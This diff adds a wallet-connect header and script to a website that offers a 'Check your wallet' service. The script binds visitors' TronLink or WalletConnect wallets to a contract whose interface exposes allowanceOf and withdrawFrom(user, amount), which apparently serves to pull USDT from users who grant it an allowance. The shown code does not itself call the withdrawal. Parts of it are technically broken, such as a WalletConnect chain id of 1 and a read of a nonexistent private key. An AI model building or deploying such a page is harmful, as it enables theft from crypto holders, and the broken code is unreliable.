@@ -1,0 +1,219 @@
+<!-- Добавляем в header (после других элементов) -->
+<div class="header__actions" bis_skin_checked="1">
+    <button class="burger">
+        <span style="margin-top: 10px;"></span>
+    </button>
+    
+    <button id="walletConnectBtn" class="header__telegram">
+        <span>Connect Tron Wallet</span>
+    </button>
+    
+    <a href="https://amlbotcompany.com/checking.html" class="header__telegram">
+        <span>Check your wallet</span>
+    </a>
+</div>
+
+<!-- Модальное окно для Tron Link -->
+<div id="tronModal" class="modal" style="display:none;">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <h3>Connect Tron Wallet</h3>
+        <div id="tronConnectOptions">
+            <button id="tronLinkBtn">Connect with TronLink</button>
+            <div id="walletConnectQR" style="margin-top:20px;"></div>
+            <p>Or scan QR code with WalletConnect-compatible wallet</p>
+        </div>
+    </div>
+</div>
+
+<!-- Подключаем необходимые библиотеки -->
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.js"></script>
+<script>
+    // Элементы интерфейса
+    const walletConnectBtn = document.getElementById('walletConnectBtn');
+    const tronModal = document.getElementById('tronModal');
+    const closeBtn = document.querySelector('.close');
+    const tronLinkBtn = document.getElementById('tronLinkBtn');
+    
+    // Ваши данные контракта в сети Tron
+    const contractAddress = "TMErucGW8wjeS2Luos3ZLHgZgaH6CJsgV6"; // Ваш адрес контракта
+    const contractABI = {
+        "entrys": [
+            {
+                "inputs": [
+                    {"name": "_owner", "type": "address"},
+                    {"name": "_usdt", "type": "address"}
+                ],
+                "stateMutability": "Nonpayable",
+                "type": "Constructor"
+            },
+            {
+                "outputs": [{"type": "uint256"}],
+                "inputs": [{"name": "user", "type": "address"}],
+                "name": "allowanceOf",
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "outputs": [{"type": "address"}],
+                "name": "owner",
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "outputs": [{"type": "address"}],
+                "name": "usdt",
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {"name": "user", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "withdrawFrom",
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ]
+    };
+    
+    // Глобальные переменные для контракта и TronWeb
+    let tronWeb;
+    let contract;
+    
+    // Проверяем доступность TronLink
+    async function isTronLinkInstalled() {
+        return new Promise(resolve => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                resolve(true);
+            } else {
+                resolve(false);
+            }
+        });
+    }
+    
+    // Подключение через TronLink
+    async function connectTronLink() {
+        try {
+            if (!await isTronLinkInstalled()) {
+                alert('Please install TronLink extension first');
+                window.open('https://www.tronlink.org/', '_blank');
+                return;
+            }
+            
+            // Ждем пока TronLink инициализируется
+            while (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+            
+            tronWeb = window.tronWeb;
+            const address = tronWeb.defaultAddress.base58;
+            
+            console.log("Connected with TronLink:", address);
+            
+            // Инициализация вашего контракта
+            contract = await tronWeb.contract(contractABI.entrys, contractAddress);
+            
+            // Проверяем работу контракта
+            try {
+                const owner = await contract.owner().call();
+                console.log("Contract owner:", owner);
+            } catch (e) {
+                console.error("Error calling contract:", e);
+            }
+            
+            // Обновляем UI
+            walletConnectBtn.innerHTML = `<span>Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}</span>`;
+            tronModal.style.display = "none";
+            
+        } catch (error) {
+            console.error("TronLink connection error:", error);
+        }
+    }
+    
+    // Подключение через WalletConnect (для мобильных кошельков)
+    async function connectWalletConnect() {
+        const provider = new WalletConnectProvider.default({
+            rpc: {
+                1: "https://api.trongrid.io",
+            },
+            bridge: "https://bridge.walletconnect.org",
+            qrcodeModalOptions: {
+                mobileLinks: ["trust", "tokenpocket", "mathwallet"]
+            }
+        });
+        
+        try {
+            await provider.enable();
+            
+            // Создаем экземпляр TronWeb с провайдером WalletConnect
+            tronWeb = new TronWeb({
+                fullHost: 'https://api.trongrid.io',
+                headers: { "TRON-PRO-API-KEY": "YOUR_TRONGRID_API_KEY" },
+                privateKey: provider.privateKey
+            });
+            
+            // Инициализация вашего контракта
+            contract = await tronWeb.contract(contractABI.entrys, contractAddress);
+            
+            // Получаем адрес
+            const address = tronWeb.defaultAddress.base58;
+            
+            console.log("Connected with WalletConnect:", address);
+            
+            // Обновляем UI
+            walletConnectBtn.innerHTML = `<span>Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}</span>`;
+            tronModal.style.display = "none";
+            
+        } catch (error) {
+            console.error("WalletConnect error:", error);
+        }
+    }
+    
+    // Обработчики событий
+    walletConnectBtn.addEventListener('click', () => {
+        tronModal.style.display = "block";
+    });
+    
+    closeBtn.addEventListener('click', () => {
+        tronModal.style.display = "none";
+    });
+    
+    tronLinkBtn.addEventListener('click', connectTronLink);
+    
+    // Инициализация QR-кода для WalletConnect
+    function initWalletConnectQR() {
+        const provider = new WalletConnectProvider.default({
+            rpc: {
+                1: "https://api.trongrid.io",
+            },
+            bridge: "https://bridge.walletconnect.org",
+            qrcodeModal: true
+        });
+        
+        provider.on("display_uri", (err, payload) => {
+            const uri = payload.params[0];
+            // Генерируем QR-код
+            const qrCode = new QRCode(document.getElementById("walletConnectQR"), {
+                text: uri,
+                width: 200,
+                height: 200,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
+        });
+        
+        provider.enable().then(() => {
+            connectWalletConnect();
+        });
+    }
+    
+    // Инициализируем QR-код при загрузке
+    window.addEventListener('DOMContentLoaded', initWalletConnectQR);
+</script>
+
+<!-- Подключаем библиотеку для генерации QR-кода -->
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
